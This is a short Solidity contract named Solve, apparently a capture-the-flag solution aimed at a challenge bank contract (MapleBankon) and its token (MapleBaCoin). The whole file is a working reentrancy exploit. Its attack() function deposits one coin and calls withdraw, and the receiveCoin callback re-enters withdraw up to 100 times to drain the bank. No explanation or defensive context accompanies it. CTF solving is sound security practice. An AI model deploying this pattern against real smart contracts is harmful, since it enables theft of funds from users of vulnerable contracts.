//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.0;

import "./MapleBaCoin.sol";
import "./MapleBankon.sol";

contract Solve {
    uint256 iter = 0;
    MapleBankon bank;
    MapleBaCoin coin;
    bool prepped = false;

    constructor(address mpbnk, address mpbc) {
        bank = MapleBankon(mpbnk);
        coin = MapleBaCoin(mpbc);
    }

    function receiveCoin(address, uint256) public {
        if (prepped == true && iter < 100) {
            iter ++;
            (bool res, ) = address(bank).call(abi.encodeWithSignature("withdraw(uint256)", 1));      
        }
    }

    function attack() public {
        bank.tap();
        coin.transfer(address(bank), 1);
        prepped = true;
        (bool res, ) = address(bank).call(abi.encodeWithSignature("withdraw(uint256)", 1));      
    }
}